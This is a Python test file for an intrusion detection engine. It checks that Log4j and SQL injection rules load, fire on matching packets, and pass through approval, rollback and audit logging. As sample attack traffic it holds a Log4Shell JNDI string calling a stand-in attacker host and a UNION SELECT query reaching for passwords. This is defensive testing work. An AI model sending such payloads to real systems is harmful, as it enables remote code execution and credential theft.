import time
import os
from backend.database import Database
from backend.detector import DetectionEngine

TEST_DB_PATH = "backend/test_adaptive.db"

def cleanup():
    if os.path.exists(TEST_DB_PATH):
        try:
            os.remove(TEST_DB_PATH)
        except OSError:
            pass

def test_dynamic_rule_persistence_and_matching():
    db = Database(TEST_DB_PATH)
    engine = DetectionEngine(db=db)

    # 1. Propose and add an active dynamic rule (e.g. Log4j / JNDI exploit detection)
    rule = {
        "rule_id": "RULE_LOG4J_001",
        "name": "Log4j JNDI Exploit Probe",
        "category": "LOG4J_EXPLOIT",
        "pattern": r"\$\{jndi:(?:ldap|rmi)://",
        "target_field": "payload",
        "severity": "CRITICAL",
        "threat_score": 95,
        "description": "Remote JNDI lookup attempt in payload header",
        "version": 1,
        "status": "ACTIVE"
    }
    db.insert_detection_rule(rule)
    engine.sync_rules_from_db()

    # Verify rule loaded in engine
    assert "RULE_LOG4J_001" in engine.dynamic_rules

    # 2. Test benign payload -> No alert
    benign_pkt = {
        "ts": time.time(),
        "source_ip": "192.168.1.50",
        "destination_ip": "192.168.1.1",
        "destination_port": 80,
        "protocol": "TCP",
        "payload": "GET /index.html HTTP/1.1\r\nUser-Agent: Mozilla/5.0"
    }
    alerts = engine.process_packet(benign_pkt)
    assert len(alerts) == 0

    # 3. Test matching attack payload -> Alert fired
    attack_pkt = {
        "ts": time.time(),
        "source_ip": "45.33.32.156",
        "destination_ip": "192.168.1.1",
        "destination_port": 8080,
        "protocol": "TCP",
        "payload": "GET /api HTTP/1.1\r\nUser-Agent: ${jndi:ldap://evil.attacker.com/a}"
    }
    alerts = engine.process_packet(attack_pkt)
    assert len(alerts) == 1
    assert alerts[0]["alert_type"] == "LOG4J_EXPLOIT"
    assert alerts[0]["severity"] == "CRITICAL"
    assert alerts[0]["threat_score"] == 95

def test_candidate_rule_lifecycle_approval_and_rollback():
    db = Database(TEST_DB_PATH)
    engine = DetectionEngine(db=db)

    # 1. Insert Candidate Rule (Pending)
    cand = {
        "candidate_id": "CAND_SQLI_UNION",
        "name": "SQL Injection UNION SELECT",
        "category": "SQLI_PROBE",
        "pattern": r"(?i)union\s+select",
        "target_field": "payload",
        "severity": "HIGH",
        "threat_score": 85,
        "rationale": "High frequency of UNION SELECT in query parameters",
        "trigger_sample": "id=1 union select 1,2,3",
        "validation_status": "PENDING"
    }
    db.insert_candidate_rule(cand)

    # Verify candidate is NOT active in engine
    engine.sync_rules_from_db()
    assert "RULE_CAND_SQLI_UNION" not in engine.dynamic_rules

    # 2. Candidate evaluation before approval -> Fails to trigger
    sqli_pkt = {
        "ts": time.time(),
        "source_ip": "192.168.1.99",
        "destination_ip": "192.168.1.1",
        "destination_port": 80,
        "protocol": "TCP",
        "payload": "GET /products?id=1%20UNION%20SELECT%20user,password%20FROM%20users"
    }
    alerts = engine.process_packet(sqli_pkt)
    assert len(alerts) == 0

    # 3. Approve Candidate -> Promoted to Active
    ok, rule_id = db.approve_candidate_rule("CAND_SQLI_UNION", approver="LEAD_ARCHITECT")
    assert ok is True
    assert rule_id == "RULE_CAND_SQLI_UNION"

    # Sync and verify now active
    engine.sync_rules_from_db()
    assert "RULE_CAND_SQLI_UNION" in engine.dynamic_rules

    # 4. Now attack triggers alert
    alerts = engine.process_packet(sqli_pkt)
    assert len(alerts) == 1
    assert alerts[0]["alert_type"] == "SQLI_PROBE"

    # 5. Disable / Rollback Rule
    db.set_rule_status(rule_id, "INACTIVE", actor="LEAD_ARCHITECT")
    engine.sync_rules_from_db()
    assert rule_id not in engine.dynamic_rules

    # Verify audit logs exist
    logs = db.get_rule_audit_logs()
    assert len(logs) >= 2
    actions = [l["action"] for l in logs]
    assert "PROMOTE_CANDIDATE" in actions
    assert "STATUS_INACTIVE" in actions

if __name__ == "__main__":
    cleanup()
    try:
        test_dynamic_rule_persistence_and_matching()
        cleanup()
        test_candidate_rule_lifecycle_approval_and_rollback()
    finally:
        cleanup()
    print("All adaptive rulebook tests passed successfully!")
